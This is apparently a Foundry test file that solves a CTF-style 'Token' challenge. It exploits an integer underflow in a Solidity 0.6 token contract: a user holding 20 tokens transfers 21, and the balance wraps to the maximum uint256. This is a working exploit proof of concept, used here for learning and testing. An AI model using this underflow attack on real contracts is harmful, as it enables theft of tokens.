// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Token.sol";

contract CounterTest is Test {
    Token public tokenContract;
    address someRandomUser = vm.addr(1);

    function setUp() public {
        tokenContract = new Token(10e18);
        // initial setup accodring to question
        tokenContract.transfer(someRandomUser, 20);
    }

    /* standard underflow question  

    */
    function test_HackToGetMoreTokens() public {
        // initial balance should be 20
        assertEq(tokenContract.balanceOf(someRandomUser), 20);
        vm.prank(someRandomUser);
        tokenContract.transfer(address(0), 21);
        // balance should be equal to uint256 max value
        assertEq(tokenContract.balanceOf(someRandomUser), 2 ** 256 - 1);
        assertEq(tokenContract.balanceOf(address(0)), 21);
    }
}
